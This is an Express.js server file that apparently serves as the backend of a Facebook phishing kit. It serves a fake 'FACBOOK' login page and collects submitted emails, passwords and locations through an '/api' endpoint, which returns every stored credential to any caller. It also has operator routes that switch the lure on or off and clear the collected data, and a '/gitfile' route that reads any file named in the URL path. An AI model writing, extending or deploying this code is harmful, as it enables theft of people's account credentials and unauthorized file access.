const express = require('express')
const app = express()
const cors = require('cors')
app.use(cors({
    origin : 'https://islam-07.onrender.com'
}))
app.use(express.json())
app.use(express.urlencoded({extended :true}))

app.use((req,res,next)=>{
    res.setHeader("Access-Control-Allow-Origin","*")
    res.setHeader("Access-Control-Allow-Methods","*")
    res.setHeader("Access-Control-Allow-Headers","Authorization")
    next()
})
app.get('/',(req,res)=>{

    res.send('<h1>islam</h1>')
})
var FACBOOK = false;
var F ='//FACBOOK//Login.html'
app.get('/FACBOOK/login',(req,res)=>{

    res.sendFile(__dirname + F)
})
var data = []
app.post('/api',(req,res)=>{
    var body = req.body
    //console.log(data.length)
    var length = data.length
    var bod ={
        Location:body.Location,
        Email:body.Email,
        Password:body.Password
    }
    var T = true
    
    for (let e = 0; e < data.length; e++) {
        if (data[e].Email == body.Email && data[e].Password == body.Password){
            T = false
            console.log('--->'+T+' POST')
        }
        
    }
    if (T == true) {
        if (bod.Email != 'null' && bod.Password != 'null') {
            
            data.unshift(bod)
        }
        
    }
    res.json(data)
})
app.get('/data',(req,res)=>{
    
    res.sendFile(__dirname+'//DATA//index.html')
})
app.post('/online',(req,res)=>{
    var id = req.body
    if (id.id == 'FACBOOK') {
        FACBOOK = true
        console.log(id.id)

    }
res.json({islam:'islam'})
})
app.post('/online/test',(req,res)=>{  
res.json({facbook:FACBOOK})
})
app.post('/DS',(req,res)=>{
    var body = req.body.I
    console.log(F)
    if (body == 'A') {
         F ='//FACBOOK//Login.html'
    }else if (body == 'O'){
         F =''
    }else if (body == 'D') {
        data = []
    }else{}
    res.json({FTF : F})
})
setInterval(function(){
    FACBOOK = false

},10000)

app.get('/gitfile/:I1/:I2/:I3/:I4/:I5',(req,res)=>{
    var I1 = '//' + req.params.I1
    var I2 = '//' + req.params.I2
    var I3 = '//' + req.params.I3
    var I4 = '//' + req.params.I4       
    var I5 = '//' + req.params.I5       
    if (I2 == '//null') {
        I2 = ""
        I3 = ""
        I4 = "" 
        I5 = ""
    }else if (I3 == '//null'){
        I3 = ""
        I4 = ""
        I5 = ""
    }else if (I4 == '//null') {
        I4 = ""
        I5 = ""
    }else if (I5 == '//null'){
        I5 = ""
    }
    res.sendFile(__dirname+`${I1}${I2}${I3}${I4}${I5}`)
})

app.listen(2007,function(){
    console.log('islam : 2007')
})